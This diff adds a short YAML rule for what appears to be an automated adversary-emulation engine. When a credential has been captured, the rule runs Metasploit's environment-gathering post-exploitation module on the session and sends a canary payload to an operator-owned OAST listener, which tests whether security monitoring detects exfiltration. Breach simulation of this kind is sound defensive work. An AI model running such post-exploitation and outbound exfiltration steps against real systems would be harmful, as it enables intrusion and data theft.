@@ -1,0 +1,26 @@
+id: r.exfil.simulation.canary
+version: 1
+description: >
+  Simulate exfiltration by sending a canary payload to an operator-owned
+  OAST listener. Validates SOC detection — never touches real data.
+phase: exfil_simulation
+priority: 15
+persona: [black]
+tags: [exfil, simulation, canary, replica_only]
+
+when:
+  all:
+    - fact_type: credential
+    - not_fact:
+        fact_type: exfil_channel
+        where: { host: "$fact.host" }
+
+then:
+  action: execute_tool
+  tool: metasploit
+  params:
+    session: "$fact.session_id"
+    module:  "post/multi/gather/env"
+    payload: "canary://operator-oast.internal/exfil"
+  on_success:
+    - emit_fact: exfil_channel
